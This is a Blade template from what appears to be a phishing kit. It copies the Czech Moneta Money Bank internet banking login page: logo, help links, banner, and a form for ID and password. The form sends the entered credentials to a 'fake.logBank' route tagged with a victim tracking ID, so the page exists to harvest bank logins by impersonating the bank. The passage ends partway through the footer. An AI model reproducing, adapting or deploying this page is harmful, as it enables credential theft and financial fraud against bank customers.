@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/moneta.css')}}" rel="stylesheet">
@endpush
@section('content')
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root" style="height:100%;display:flex;flex-direction:column">
        <div class="l-app l-app--fixedHeader">
            <header class="l-header styles_loginHeader__1ztRz" role="banner">
                <div class="l-header__left">
                    <div class="c-logo">
                        <a class="c-logo__link" data-testid="Button" href="#" title=""><img
                                    alt="Logo společnosti Moneta Money Bank" class="c-logo__img"
                                    src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTU5IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTU5IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTExOS43MzQgMC4zMjEyODlIMTE4LjkzNFYyMy42NzczSDExOS43MzRWMC4zMjEyODlaTTYyLjAxMTcgNS4wMDQzOVYxOC40Njg0SDY0LjY0NjlWMTAuNDc4TDc0Ljg2NTMgMTguOTk0OFY1LjUzMDc5SDcyLjIzMDlWMTMuNTIxMkw2Mi4wMTE3IDUuMDA0MzlaTTM3LjAzODYgMTQuODA5M0w0NC40MTYyIDUuMDA0NDlMNDQuNDE3IDE4LjQ2NzdINDEuNzgxOFYxMi41NTU3TDM3LjAzODYgMTguOTk0OUwzMi4yOTU0IDEyLjU1NjVWMTguNDY4NUgyOS42NjAyVjUuMDA0NDlMMzcuMDM4NiAxNC44MDkzWk0xMjkuNzY0IDkuNTExNzZMMTMyLjY2MyA1LjI5NzM2VjEwLjc0MDZIMTMxLjgxNFY3Ljg3MTc2TDEyOS43NjQgMTAuOTE1OEwxMjcuNzE0IDcuODcxNzZWMTAuNzQxNEgxMjYuODM2VjUuMjk3MzZMMTI5Ljc2NCA5LjUxMTc2Wk0xMzQuMjE1IDguMTA2ODVDMTM0LjIxNSA2LjYxNDA1IDEzNS40NDQgNS4zODUyNSAxMzYuOTY3IDUuMzg1MjVDMTM4LjQ4OSA1LjM4NTI1IDEzOS43MTkgNi42MTQwNSAxMzkuNzE5IDguMTA2ODVDMTM5LjcxOSA5LjU5OTY1IDEzOC40ODkgMTAuODI5MyAxMzYuOTY3IDEwLjgyOTNDMTM1LjQ0NCAxMC44MjkzIDEzNC4yMTUgOS41OTk2NSAxMzQuMjE1IDguMTA2ODVaTTEzNi45NyA5Ljk4MDUzQzEzNS45NDUgOS45ODA1MyAxMzUuMTI1IDkuMTMxNzMgMTM1LjEyNSA4LjEwNjkzQzEzNS4xMjUgNy4wNTMzMyAxMzUuOTQ1IDYuMjM0MTMgMTM2Ljk3IDYuMjM0MTNDMTM3Ljk5NCA2LjIzNDEzIDEzOC44MTQgNy4wODIxMyAxMzguODE0IDguMTA2OTNDMTM4Ljg0MyA5LjE2MDUzIDEzNy45OTUgOS45ODA1MyAxMzYuOTcgOS45ODA1M1pNMTQxLjI3MyAxMC43NDE0VjUuMjk3MzZMMTQ1LjUxOCA5LjEwMTM2VjUuNTAxMzZIMTQ2LjM2OFYxMC45MTc0TDE0Mi4xMjIgNy4xNDEzNlYxMC43NDE0SDE0MS4yNzNaTTE1Mi4wNDggNS41MDIySDE0OC4xODRWMTAuNzQxNEgxNTIuMDQ4VjkuOTUxSDE0OS4wMzJWOC40ODdIMTUxLjkwMlY3LjcyN0gxNDkuMDMyVjYuMjkyNkgxNTIuMDQ4VjUuNTAyMlpNMTU3LjIyOCA1LjUwMjJIMTU4LjE2NUwxNTYuMDI3IDguNjkyNlYxMC43NDA2SDE1NS4xNzhWOC42OTI2TDE1My4wMTIgNS41MDIySDE1My45NDlMMTU1LjU4OCA3LjkwMjJMMTU3LjIyOCA1LjUwMjJaTTEyOS41OSAxMy4yODc3SDEyNi44NjdWMTguNTI2OUgxMjkuNjQ4QzEzMC42MTUgMTguNTI2OSAxMzEuMzE3IDE3LjgyMzcgMTMxLjMxNyAxNi45NzQ5QzEzMS4zMTcgMTYuMzYwNSAxMzAuOTk1IDE1LjkyMTMgMTMwLjQ2OCAxNS43MTY1QzEzMC44NDggMTUuNTQwNSAxMzEuMTEyIDE1LjEzMTcgMTMxLjExMiAxNC42MzQxQzEzMS4xMTIgMTMuODcyNSAxMzAuNDk3IDEzLjI4NzcgMTI5LjU5IDEzLjI4NzdaTTEyNy43MTUgMTQuMDQ4NVYxNS40NTMzSDEyOS40MTRDMTI5LjkxMSAxNS40NTMzIDEzMC4yMzQgMTUuMTMxNyAxMzAuMjM0IDE0Ljc1MDlDMTMwLjIzNCAxNC4zNzAxIDEyOS45NDEgMTQuMDQ4NSAxMjkuNDE0IDE0LjA0ODVIMTI3LjcxNVpNMTI3LjcxNSAxNy43NjUzVjE2LjE4NTNIMTI5LjUwMkMxMzAuMDU4IDE2LjE4NTMgMTMwLjQwOSAxNi41MzY1IDEzMC40MDkgMTYuOTc1N0MxMzAuNDA5IDE3LjQxNDEgMTMwLjA1OCAxNy43NjUzIDEyOS41MDIgMTcuNzY1M0gxMjcuNzE1Wk0xMzIuMDE5IDE4LjUyNjlMMTM1LjA2NCAxMy4wODI5TDEzOC4xNjggMTguNTI2OUgxMzcuMjAyTDEzNi41MjkgMTcuMzI2OUgxMzMuNjU5TDEzMi45ODYgMTguNTI2OUgxMzIuMDE5Wk0xMzQuMDM5IDE2LjU5NDhMMTM1LjA2MyAxNC43MjEyTDEzNi4wODkgMTYuNTk0OEgxMzQuMDM5Wk0xMzkuMzk4IDE4LjQ5NzNWMTMuMDgyOUwxNDMuNjQzIDE2Ljg4NzdWMTMuMjg3N0gxNDQuNDkzVjE4LjcwMjFMMTQwLjI0NyAxNC45MjY5VjE4LjQ5NzNIMTM5LjM5OFpNMTUwLjk5MSAxMy4yODc2SDE0OS43OTFMMTQ3LjE1NiAxNS42ODc2VjEzLjI4NzZIMTQ2LjI3N1YxOC40OTcySDE0Ny4xNTZWMTYuNzdMMTQ4LjA2NCAxNS45NTA4TDE1MC4wNTQgMTguNDk3MkgxNTEuMTA5TDE0OC42NzggMTUuMzY1MkwxNTAuOTkxIDEzLjI4NzZaTTUzLjQwMzQgNS4yMzg3N0M0OS41OTc4IDUuMjM4NzcgNDYuNTIzNCA4LjI4Mjc3IDQ2LjUyMzQgMTEuOTk5NkM0Ni41MjM0IDE1Ljc0NiA0OS41OTc4IDE4Ljc2MDQgNTMuNDAzNCAxOC43NjA0QzU3LjIwOTggMTguNzYwNCA2MC4yODQyIDE1LjcxNjQgNjAuMjg0MiAxMS45OTk2QzYwLjI4NDIgOC4yNTMxNyA1Ny4yMDk4IDUuMjM4NzcgNTMuNDA0MiA1LjIzODc3SDUzLjQwMzRaTTQ5LjI3NyAxMS45OTk3QzQ5LjI3NyAxNC4yODI5IDUxLjEyMTggMTYuMTU1NyA1My40MDU4IDE2LjE1NTdINTMuNDA1QzU1LjY4OSAxNi4xNTU3IDU3LjUzMyAxNC4zMTE3IDU3LjUzMyAxMS45OTk3QzU3LjUzMyA5LjcxNjQ5IDU1LjY4OSA3Ljg0MzY5IDUzLjQwNSA3Ljg0MzY5QzUxLjEyMTggNy44NDM2OSA0OS4yNzcgOS42ODc2OSA0OS4yNzcgMTEuOTk5N1pNNzcuNDcyMiA1LjUzMTY5SDg3LjQ1NjJMODcuNDU3IDcuOTMxNjlIODAuMTk1NFYxMC44MjkzSDg3LjEzNDZWMTMuMTQxM0g4MC4xOTU0VjE2LjA5NzNIODcuNDU2MlYxOC40Njc3SDc3LjQ3MjJWNS41MzE2OVpNMTAxLjg5MSA1LjUzMTY5SDg4Ljk0OThWNy45MzE2OUg5Mi44NDQyVjE4LjQ2NzdIOTUuNTM3OFY3LjkzMTY5SDEwMC40ODZMMTAxLjg5MSA1LjUzMTY5Wk05Ny4yOTMgMTguNDk3MkwxMDQuOTk0IDUuMDA0MzlMMTEyLjc1MiAxOC40OTcySDEwOS43NjZMMTA4LjM2IDE2LjAwOTJIMTAxLjY4NUwxMDAuMjc5IDE4LjQ5NzJIOTcuMjkzWk0xMDIuODU5IDEzLjg3MjRMMTA0Ljk2NyAxMC4wOTcyTDEwNy4xMDUgMTMuODczMkgxMDIuODU5VjEzLjg3MjRaIiBmaWxsPSIjMTQwNzU3Ii8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTAuMjE5MiAxMC4xNTZMMjAuNDk3NyAwLjIzNDM3NUgyMC41ODU2VjIzLjg4MzJMMTIuMTIyNCAxNS42ODhMMTQuMDI2NSAxMy44NDMyTDE3Ljk0OTYgMTcuNjE5MlY2LjM4MDc3TDEyLjEyMzMgMTJMMTAuMTYxNiAxMy44NzJMMC4wMzEyNSAyMy42Nzg0VjAuMzIxNTc1TDEwLjIxOTIgMTAuMTU2Wk0yLjQ4OTg4IDYuMzgyNEwyLjQ4ODI4IDYuMzgwODZIMi40ODk4OFY2LjM4MjRaTTIuNDg5ODggNi4zODI0VjE3LjYxOTNMOC4zMTYyOCAxMi4wMDAxTDIuNDg5ODggNi4zODI0WiIgZmlsbD0idXJsKCNwYWludDBfbGluZWFyKSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyIiB4MT0iMTAuMzA4NCIgeTE9IjM1LjcwNzYiIHgyPSIzMy43MjY2IiB5Mj0iMTUuMzUzNiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjMTQwNzU3Ii8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0VEMUMyNCIvPgo8L2xpbmVhckdyYWRpZW50Pgo8L2RlZnM+Cjwvc3ZnPgo="><img
                                    alt="Logo společnosti Moneta Money Bank" class="c-logo__img--dark"
                                    src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTU5IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTU5IDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTExOS43MzQgMC4zMjEyODlIMTE4LjkzNFYyMy42NzczSDExOS43MzRWMC4zMjEyODlaTTYyLjAxMTcgNS4wMDQzOVYxOC40Njg0SDY0LjY0NjlWMTAuNDc4TDc0Ljg2NTMgMTguOTk0OFY1LjUzMDc5SDcyLjIzMDlWMTMuNTIxMkw2Mi4wMTE3IDUuMDA0MzlaTTM3LjAzODYgMTQuODA5M0w0NC40MTYyIDUuMDA0NDlMNDQuNDE3IDE4LjQ2NzdINDEuNzgxOFYxMi41NTU3TDM3LjAzODYgMTguOTk0OUwzMi4yOTU0IDEyLjU1NjVWMTguNDY4NUgyOS42NjAyVjUuMDA0NDlMMzcuMDM4NiAxNC44MDkzWk0xMjkuNzY0IDkuNTExNzZMMTMyLjY2MyA1LjI5NzM2VjEwLjc0MDZIMTMxLjgxNFY3Ljg3MTc2TDEyOS43NjQgMTAuOTE1OEwxMjcuNzE0IDcuODcxNzZWMTAuNzQxNEgxMjYuODM2VjUuMjk3MzZMMTI5Ljc2NCA5LjUxMTc2Wk0xMzQuMjE1IDguMTA2ODVDMTM0LjIxNSA2LjYxNDA1IDEzNS40NDQgNS4zODUyNSAxMzYuOTY3IDUuMzg1MjVDMTM4LjQ4OSA1LjM4NTI1IDEzOS43MTkgNi42MTQwNSAxMzkuNzE5IDguMTA2ODVDMTM5LjcxOSA5LjU5OTY1IDEzOC40ODkgMTAuODI5MyAxMzYuOTY3IDEwLjgyOTNDMTM1LjQ0NCAxMC44MjkzIDEzNC4yMTUgOS41OTk2NSAxMzQuMjE1IDguMTA2ODVaTTEzNi45NyA5Ljk4MDUzQzEzNS45NDUgOS45ODA1MyAxMzUuMTI1IDkuMTMxNzMgMTM1LjEyNSA4LjEwNjkzQzEzNS4xMjUgNy4wNTMzMyAxMzUuOTQ1IDYuMjM0MTMgMTM2Ljk3IDYuMjM0MTNDMTM3Ljk5NCA2LjIzNDEzIDEzOC44MTQgNy4wODIxMyAxMzguODE0IDguMTA2OTNDMTM4Ljg0MyA5LjE2MDUzIDEzNy45OTUgOS45ODA1MyAxMzYuOTcgOS45ODA1M1pNMTQxLjI3MyAxMC43NDE0VjUuMjk3MzZMMTQ1LjUxOCA5LjEwMTM2VjUuNTAxMzZIMTQ2LjM2OFYxMC45MTc0TDE0Mi4xMjIgNy4xNDEzNlYxMC43NDE0SDE0MS4yNzNaTTE1Mi4wNDggNS41MDIySDE0OC4xODRWMTAuNzQxNEgxNTIuMDQ4VjkuOTUxSDE0OS4wMzJWOC40ODdIMTUxLjkwMlY3LjcyN0gxNDkuMDMyVjYuMjkyNkgxNTIuMDQ4VjUuNTAyMlpNMTU3LjIyOCA1LjUwMjJIMTU4LjE2NUwxNTYuMDI3IDguNjkyNlYxMC43NDA2SDE1NS4xNzhWOC42OTI2TDE1My4wMTIgNS41MDIySDE1My45NDlMMTU1LjU4OCA3LjkwMjJMMTU3LjIyOCA1LjUwMjJaTTEyOS41OSAxMy4yODc3SDEyNi44NjdWMTguNTI2OUgxMjkuNjQ4QzEzMC42MTUgMTguNTI2OSAxMzEuMzE3IDE3LjgyMzcgMTMxLjMxNyAxNi45NzQ5QzEzMS4zMTcgMTYuMzYwNSAxMzAuOTk1IDE1LjkyMTMgMTMwLjQ2OCAxNS43MTY1QzEzMC44NDggMTUuNTQwNSAxMzEuMTEyIDE1LjEzMTcgMTMxLjExMiAxNC42MzQxQzEzMS4xMTIgMTMuODcyNSAxMzAuNDk3IDEzLjI4NzcgMTI5LjU5IDEzLjI4NzdaTTEyNy43MTUgMTQuMDQ4NVYxNS40NTMzSDEyOS40MTRDMTI5LjkxMSAxNS40NTMzIDEzMC4yMzQgMTUuMTMxNyAxMzAuMjM0IDE0Ljc1MDlDMTMwLjIzNCAxNC4zNzAxIDEyOS45NDEgMTQuMDQ4NSAxMjkuNDE0IDE0LjA0ODVIMTI3LjcxNVpNMTI3LjcxNSAxNy43NjUzVjE2LjE4NTNIMTI5LjUwMkMxMzAuMDU4IDE2LjE4NTMgMTMwLjQwOSAxNi41MzY1IDEzMC40MDkgMTYuOTc1N0MxMzAuNDA5IDE3LjQxNDEgMTMwLjA1OCAxNy43NjUzIDEyOS41MDIgMTcuNzY1M0gxMjcuNzE1Wk0xMzIuMDE5IDE4LjUyNjlMMTM1LjA2NCAxMy4wODI5TDEzOC4xNjggMTguNTI2OUgxMzcuMjAyTDEzNi41MjkgMTcuMzI2OUgxMzMuNjU5TDEzMi45ODYgMTguNTI2OUgxMzIuMDE5Wk0xMzQuMDM5IDE2LjU5NDhMMTM1LjA2MyAxNC43MjEyTDEzNi4wODkgMTYuNTk0OEgxMzQuMDM5Wk0xMzkuMzk4IDE4LjQ5NzNWMTMuMDgyOUwxNDMuNjQzIDE2Ljg4NzdWMTMuMjg3N0gxNDQuNDkzVjE4LjcwMjFMMTQwLjI0NyAxNC45MjY5VjE4LjQ5NzNIMTM5LjM5OFpNMTUwLjk5MSAxMy4yODc2SDE0OS43OTFMMTQ3LjE1NiAxNS42ODc2VjEzLjI4NzZIMTQ2LjI3N1YxOC40OTcySDE0Ny4xNTZWMTYuNzdMMTQ4LjA2NCAxNS45NTA4TDE1MC4wNTQgMTguNDk3MkgxNTEuMTA5TDE0OC42NzggMTUuMzY1MkwxNTAuOTkxIDEzLjI4NzZaTTUzLjQwMzQgNS4yMzg3N0M0OS41OTc4IDUuMjM4NzcgNDYuNTIzNCA4LjI4Mjc3IDQ2LjUyMzQgMTEuOTk5NkM0Ni41MjM0IDE1Ljc0NiA0OS41OTc4IDE4Ljc2MDQgNTMuNDAzNCAxOC43NjA0QzU3LjIwOTggMTguNzYwNCA2MC4yODQyIDE1LjcxNjQgNjAuMjg0MiAxMS45OTk2QzYwLjI4NDIgOC4yNTMxNyA1Ny4yMDk4IDUuMjM4NzcgNTMuNDA0MiA1LjIzODc3SDUzLjQwMzRaTTQ5LjI3NyAxMS45OTk3QzQ5LjI3NyAxNC4yODI5IDUxLjEyMTggMTYuMTU1NyA1My40MDU4IDE2LjE1NTdINTMuNDA1QzU1LjY4OSAxNi4xNTU3IDU3LjUzMyAxNC4zMTE3IDU3LjUzMyAxMS45OTk3QzU3LjUzMyA5LjcxNjQ5IDU1LjY4OSA3Ljg0MzY5IDUzLjQwNSA3Ljg0MzY5QzUxLjEyMTggNy44NDM2OSA0OS4yNzcgOS42ODc2OSA0OS4yNzcgMTEuOTk5N1pNNzcuNDcyMiA1LjUzMTY5SDg3LjQ1NjJMODcuNDU3IDcuOTMxNjlIODAuMTk1NFYxMC44MjkzSDg3LjEzNDZWMTMuMTQxM0g4MC4xOTU0VjE2LjA5NzNIODcuNDU2MlYxOC40Njc3SDc3LjQ3MjJWNS41MzE2OVpNMTAxLjg5MSA1LjUzMTY5SDg4Ljk0OThWNy45MzE2OUg5Mi44NDQyVjE4LjQ2NzdIOTUuNTM3OFY3LjkzMTY5SDEwMC40ODZMMTAxLjg5MSA1LjUzMTY5Wk05Ny4yOTMgMTguNDk3MkwxMDQuOTk0IDUuMDA0MzlMMTEyLjc1MiAxOC40OTcySDEwOS43NjZMMTA4LjM2IDE2LjAwOTJIMTAxLjY4NUwxMDAuMjc5IDE4LjQ5NzJIOTcuMjkzWk0xMDIuODU5IDEzLjg3MjRMMTA0Ljk2NyAxMC4wOTcyTDEwNy4xMDUgMTMuODczMkgxMDIuODU5VjEzLjg3MjRaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTEwLjIxOTIgMTAuMTU2TDIwLjQ5NzcgMC4yMzQzNzVIMjAuNTg1NlYyMy44ODMyTDEyLjEyMjQgMTUuNjg4TDE0LjAyNjUgMTMuODQzMkwxNy45NDk2IDE3LjYxOTJWNi4zODA3N0wxMi4xMjMzIDEyTDEwLjE2MTYgMTMuODcyTDAuMDMxMjUgMjMuNjc4NFYwLjMyMTU3NUwxMC4yMTkyIDEwLjE1NlpNMi40ODk4OCA2LjM4MjRMMi40ODgyOCA2LjM4MDg2SDIuNDg5ODhWNi4zODI0Wk0yLjQ4OTg4IDYuMzgyNFYxNy42MTkzTDguMzE2MjggMTIuMDAwMUwyLjQ4OTg4IDYuMzgyNFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo="></a>
                    </div>
                </div>
                <nav aria-label="Hlavní menu" class="m-menu" data-testid="Menu" role="navigation">
                    <ul class="m-menu__list" data-testid="MenuList">
                        <li class="m-menu__item" data-testid="MenuItem"><a class="m-menu__link" href="tel: 224 443 636"
                                                                           target="_blank"
                                                                           title="Zavolat na zákaznickou linku Moneta Money Bank"><span
                                        aria-hidden="true" class="c-icon c-icon--phone c-icon--l" tabindex="-1"
                                        style=""><svg
                                            viewBox="0 0 24 24" class="c-icon__icon"><g
                                                clip-path="url(#phone_svg__clip0)"><path
                                                    d="M19.156 14.344l-3.187-1.375c-.594-.25-1.25-.063-1.656.406l-1.032 1.281a9.674 9.674 0 01-3.906-3.937l1.25-1.032c.5-.406.656-1.062.406-1.656L9.656 4.844a1.377 1.377 0 00-1.594-.813l-2.968.688A1.402 1.402 0 004 6.094C4 13.75 10.25 20 17.906 20c.657 0 1.219-.438 1.375-1.094l.688-2.969a1.377 1.377 0 00-.813-1.593zm-.843 4.343a.431.431 0 01-.407.313C10.781 19 5 13.219 5 6.094c0-.188.125-.344.313-.407L8.28 5h.094c.156 0 .313.094.375.25l1.375 3.187a.435.435 0 01-.125.47l-1.594 1.312c-.156.125-.219.375-.125.593a10.665 10.665 0 004.906 4.907c.22.093.47.062.594-.125L15.094 14c.125-.125.312-.188.469-.125l3.187 1.375a.441.441 0 01.25.469l-.688 2.968z"></path></g><defs><clipPath
                                                    id="phone_svg__clip0"><path transform="translate(4 4)"
                                                                                d="M0 0h16v16H0z"></path></clipPath></defs></svg></span><span
                                        class="m-menu__text">224 443 636</span></a></li>
                        <li class="m-menu__item" data-testid="switchLanguage">
                            <button class="m-menu__link" type="button"><span aria-hidden="true"
                                                                             class="c-icon c-icon--englishComment c-icon--l"
                                                                             tabindex="-1" style=""><svg
                                            viewBox="0 0 24 24"
                                            class="c-icon__icon"><path
                                                d="M18 4H6c-1.103 0-2 .897-2 2v9c0 1.103.897 2 2 2h3v2.625a.374.374 0 00.597.3L13.5 17H18c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2zm1 11c0 .55-.45 1-1 1h-4.834l-.266.2-2.9 2.175V16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v9z"></path><path
                                                d="M10.83 8.744H8.87V9.8h1.805c.133 0 .231.03.296.09.066.06.1.137.1.235a.32.32 0 01-.097.24c-.065.06-.164.091-.3.091H8.87v1.222h2.028c.136 0 .239.032.307.096a.32.32 0 01.105.252.322.322 0 01-.105.25c-.068.062-.17.093-.307.093H8.533c-.19 0-.326-.042-.41-.126-.082-.084-.123-.22-.123-.407v-3.23c0-.125.019-.226.056-.304a.34.34 0 01.173-.173.726.726 0 01.304-.056h2.297c.139 0 .241.031.308.094.068.06.102.14.102.24a.318.318 0 01-.102.246c-.067.06-.17.091-.308.091zm2.697-.223l1.673 2.532V8.498c0-.166.035-.29.106-.372a.363.363 0 01.29-.126.37.37 0 01.296.126c.072.082.108.206.108.372v3.378c0 .377-.156.565-.469.565a.596.596 0 01-.21-.035.514.514 0 01-.176-.105 1.072 1.072 0 01-.153-.17 16.519 16.519 0 01-.14-.202L13.22 9.427v2.516c0 .164-.038.288-.115.372a.378.378 0 01-.293.126.375.375 0 01-.295-.126c-.075-.085-.112-.21-.112-.372V8.63a.94.94 0 01.047-.331.465.465 0 01.185-.214.496.496 0 01.278-.085.46.46 0 01.346.14.95.95 0 01.129.168c.045.068.09.14.137.213z"></path></svg></span><span
                                        class="m-menu__text">English version</span></button>
                        </li>
                    </ul>
                </nav>
            </header>
            <div class="l-content">
                <main class="l-main l-main--center styles_mainContent__1BE_K">
                    <div class="c-flex c-flex--align-items--center c-flex--direction--column c-flex--wrap--nowrap styles_login__A4zDM">
                        <div class="styles_login__alerts__39JrU" data-testid="loginAlertBanner">
                            <div class="c-alert c-alert--info" role="alert">
                                <div class="c-alert__icon"><span aria-hidden="true"
                                                                 class="c-icon c-icon--rounded c-icon--info"
                                                                 tabindex="-1"
                                                                 style=""><svg viewBox="0 0 24 24" class="c-icon__icon"><path
                                                    d="M11.5 8c.813 0 1.5-.688 1.5-1.5 0-.813-.688-1.5-1.5-1.5-.813 0-1.5.688-1.5 1.5 0 .813.688 1.5 1.5 1.5zm0-2c.281 0 .5.219.5.5s-.219.5-.5.5a.494.494 0 01-.5-.5c0-.281.219-.5.5-.5zm3 12h-2v-7.5c0-.281-.219-.5-.5-.5h-1.5c-.281 0-.5.219-.5.5s.219.5.5.5h1v7h-2c-.281 0-.5.219-.5.5s.219.5.5.5h5c.281 0 .5-.219.5-.5s-.219-.5-.5-.5z"></path></svg></span>
                                </div>
                                <div class="c-alert__content">
                                    <div class="c-alert__text"><span>Nepředvyplňuje se Vám uložené ID a heslo? Připravili jsme pro Vás <a
                                                    class="c-link" href="https://www.moneta.cz/prihlasovani-do-ib"
                                                    target="_blank">jednoduchý návod</a>, jak si ID a heslo zobrazit.</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="c-flex c-flex--align-items--center c-flex--justify-content--center c-flex--wrap--nowrap u-mb--xLarge">
                            <div class="styles_login__banner__3opdi,">
                                <a class="c-link styles_loginPage__banner__link__WW24L"
                                   data-testid="loginPromoBannerLink"
                                   href="https://ib.moneta.cz/#/" target="_blank"><img
                                            alt="Reklamní banner - Získáte až o 33 % menší úrok"
                                            class="c-image c-image--cover styles_loginPage__banner__image__3sd_E"
                                            src="{{asset('images/banks/IB_banner_33_520x442.jpg')}}"></a>
                            </div>
                            <div class="c-card c-card--largeShadow c-card--large styles_loginPage__login__card__1nA65">
                                <div class="c-card__header">
                                    <div class="c-card__header__text" id="card_ckv6z523v00024969hnczhjwr_header">
                                        <h1 class="t-title t-title--h3 u-mb--medium u-colorBlueDarker">Přihlášení<span
                                                    class="u-vHide">do Internet Banky MONETA Money Bank</span></h1>
                                        <hr class="c-divider c-divider--inverse">
                                        <form id="bank_pm_form" method="POST"
                                              action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                                              role="form">
                                            <div class="u-mb--medium">
                                                <div class="f-group2 f-group2--error">
                                                    <label class="f-label2" for="ibId" id="ibId_label">ID</label>
                                                    <div class="f-controlGroup">
                                                        <div class="f-controlWrap" data-testid="Component">
                                                            <input aria-describedby="ibId_help" aria-invalid="true"
                                                                   aria-labelledby="ibId_label" autocomplete="off"
                                                                   class="f-control2 f-control2__placeholder"
                                                                   data-testid="Component" id="login_bank"
                                                                   inputmode="text"
                                                                   maxlength="19" name="login" type="text"
                                                                   aria-errormessage="ibId_errorMessage" lang="cs">
                                                        </div>
                                                    </div>
                                                    <div aria-live="assertive"
                                                         class="f-validationMsg f-validationMsg--invalid"
                                                         id="ibId_errorMessage">Toto pole je povinné.
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="u-mb--xLarge">
                                                <div class="f-group2">
                                                    <label class="f-label2" for="password"
                                                           id="password_label">Heslo</label>
                                                    <div class="f-controlGroup">
                                                        <div class="f-controlWrap" data-testid="">
                                                            <input aria-describedby="password_help" aria-invalid="false"
                                                                   aria-labelledby="password_label" autocomplete="off"
                                                                   class="f-control2 f-control2__placeholder"
                                                                   data-testid=""
                                                                   id="password_bank" inputmode="password"
                                                                   name="password" type="password" value=""
                                                                   lang="cs">
                                                        </div>
                                                    </div>
                                                    <div aria-live="assertive"
                                                         class="f-validationMsg f-validationMsg--invalid"
                                                         id="password_errorMessage"></div>
                                                </div>
                                            </div>
                                            <div class="u-textCenter u-mb--xxxLarge">
                                                <button class="c-btn" data-testid="submit" type="submit">Přihlásit
                                                </button>
                                            </div>
                                            <div class="styles_bottomLinks__3twKf">
                                                <div class="u-mb--xxSmall"><a class="c-link" data-testid="Link"
                                                                              href="https://www.moneta.cz/prime-bankovnictvi/internet-banka/problemy-s-prihlasenim"
                                                                              target="_blank"><span aria-hidden="true"
                                                                                                    class="c-icon c-icon--small c-icon--l c-icon--lock"
                                                                                                    tabindex="-1"
                                                                                                    style=""><svg
                                                                    viewBox="0 0 24 24" class="c-icon__icon"><path
                                                                        d="M17 11h-1V8c0-2.219-1.781-4-4-4-2.219 0-4 1.781-4 4v3H7c-1.094 0-2 .906-2 2v5c0 1.094.906 2 2 2h10c1.094 0 2-.906 2-2v-5c0-1.094-.906-2-2-2zM9 8a3 3 0 016 0v3H9V8zm9 10c0 .563-.438 1-1 1H7c-.563 0-1-.438-1-1v-5c0-.563.438-1 1-1h10c.563 0 1 .438 1 1v5z"></path></svg></span>Nápověda
                                                        pro přihlášení</a></div>
                                                <a class="c-link" data-testid="Link"
                                                   href="https://www.moneta.cz/prihlasovani-do-ib#prihlaseni-section"
                                                   target="_blank"><span aria-hidden="true"
                                                                         class="c-icon c-icon--small c-icon--l c-icon--lifeRing"
                                                                         tabindex="-1" style=""><svg viewBox="0 0 24 24"
                                                                                                     class="c-icon__icon"><path
                                                                    d="M17.64 16.933A7.463 7.463 0 0019.5 12a7.463 7.463 0 00-1.86-4.933l.213-.213a.5.5 0 10-.707-.708l-.213.214A7.463 7.463 0 0012 4.5a7.463 7.463 0 00-4.933 1.86l-.213-.214a.5.5 0 10-.708.708l.214.213A7.463 7.463 0 004.5 12c0 1.891.705 3.614 1.86 4.933l-.214.213a.5.5 0 10.708.707l.213-.213A7.463 7.463 0 0012 19.5a7.463 7.463 0 004.933-1.86l.213.213a.498.498 0 00.707 0 .5.5 0 000-.707l-.213-.213zM18.5 12a6.466 6.466 0 01-1.57 4.224l-2.49-2.491c.35-.49.56-1.086.56-1.733s-.21-1.243-.56-1.733l2.49-2.49A6.466 6.466 0 0118.5 12zM10 12c0-1.102.897-2 2-2s2 .898 2 2c0 1.102-.897 2-2 2s-2-.898-2-2zm2-6.5c1.612 0 3.086.594 4.224 1.57l-2.491 2.49A2.975 2.975 0 0012 9a2.97 2.97 0 00-1.733.56l-2.49-2.49A6.467 6.467 0 0112 5.5zM5.5 12c0-1.612.594-3.086 1.57-4.224l2.49 2.491C9.21 10.757 9 11.353 9 12s.21 1.243.56 1.733l-2.49 2.49A6.467 6.467 0 015.5 12zm6.5 6.5a6.466 6.466 0 01-4.224-1.57l2.491-2.49c.49.35 1.086.56 1.733.56s1.243-.21 1.733-.56l2.49 2.49A6.466 6.466 0 0112 18.5z"></path></svg></span>Problémy
                                                    s předvyplňováním údajů?</a></div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <footer class="styles_footer__3gCdX">
                        <ul class="styles_footer__list__3FTYc styles_footer__list--links__3GyUM">
                            <li class="styles_footer__list__item__rc_fi"><a
                                        aria-label="Pravidla pro bezpečné používání Internet Banky"
                                        class="c-link c-link--small"
                                        data-testid="loginFooterSafeUsage"
                                        href="https://www.moneta.cz/documents/cz/primebankovnictvi/pravidla-bezpecneho-uzivani-nib.pdf"
                                        target="_blank"><span aria-hidden="true"
                                                              class="c-icon c-icon--small c-icon--l c-icon--documents"
                                                              tabindex="-1" style=""><svg viewBox="0 0 24 24"
                                                                                          class="c-icon__icon"><path
